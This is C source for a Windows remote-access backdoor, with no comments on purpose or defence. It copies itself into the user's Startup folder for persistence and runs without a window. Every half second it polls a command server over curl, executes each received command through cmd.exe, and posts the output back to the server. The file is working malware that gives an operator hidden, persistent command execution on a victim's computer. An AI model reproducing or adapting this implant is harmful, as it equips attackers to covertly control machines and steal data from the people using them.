#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#define MAX_SIZE 32768                                      // 32kb
#define SERVER "127.0.0.1:5001"

int move_to_startup();
char *get_exe_name();
char *get_cmd(const char *cmd);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
    move_to_startup(get_exe_name());
    chdir(getenv("USERPROFILE"));
    char curl[128];
    while(1){
        Sleep(500);                                         // 0.5s delay
        sprintf(curl, "curl -k -s %s/command", SERVER);
        char *command = get_cmd(curl);
        if(!command || !strlen(command)) continue;
        if(!strncmp(command, "cd", 2)){                     // changing directory
            chdir(strdup(command+3));
            command = strdup("echo.");
        }
        if(strstr(command, ">") || strstr(command, "del")){ // writing and deleting files
            get_cmd(command);
            command = strdup("echo.");
        }
        char *result = get_cmd(command);
        FILE *fp = fopen("tmp.txt", "wb");                  // ensure non-ascii characters
        size_t txt = fwrite(result, sizeof(char), strlen(result), fp);
        fclose(fp);
        sprintf(curl, "curl -k -s -X POST %s/result --data-binary @tmp.txt", SERVER);
        get_cmd(curl);
        remove("tmp.txt");
    }
}

int move_to_startup(const char *file_path){                 // 1 successfully moved, -1 error, 0 already in
    char current_path[MAX_PATH];
    GetModuleFileName(NULL, current_path, MAX_PATH);
    char destination_path[MAX_PATH];
    sprintf(destination_path, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\%s", getenv("APPDATA"), file_path);
    if(strcmp(current_path, destination_path)) return MoveFile(current_path,destination_path)?1:-1;
    return 0;
}

char *get_exe_name(){
    char exe_path[MAX_PATH];
    GetModuleFileName(NULL, exe_path, MAX_PATH);
    char *exe_name = strrchr(exe_path, '\\');
    if(exe_name != NULL) exe_name++;
    else exe_name=exe_path;
    return exe_name;
}

char *get_cmd(const char *cmd) {
    char *buffer = malloc(MAX_SIZE), *output = malloc(MAX_SIZE);
    output[0] = '\0';
    STARTUPINFO si;                                         // initialize process and its attributes
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    HANDLE hReadPipe, hWritePipe;                           // create a pipe for output redirection
    CreatePipe(&hReadPipe, &hWritePipe, &sa, 0);
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags |= STARTF_USESTDHANDLES;                     // use standard handles
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    ZeroMemory(&pi, sizeof(pi));
    char cmdline[MAX_SIZE];
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /C %s", cmd);
    CreateProcess(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(hWritePipe);
    DWORD bytesRead;
    while(ReadFile(hReadPipe, buffer, MAX_SIZE-1, &bytesRead, NULL) && bytesRead > 0){
        buffer[bytesRead] = '\0';
        if(strlen(output)+bytesRead < MAX_SIZE) strcat(output, buffer);
        else break;
    }
    CloseHandle(hReadPipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    free(buffer);
    if(output[0] == '\0'){
        free(output);
        return NULL;
    }
    return output;
}
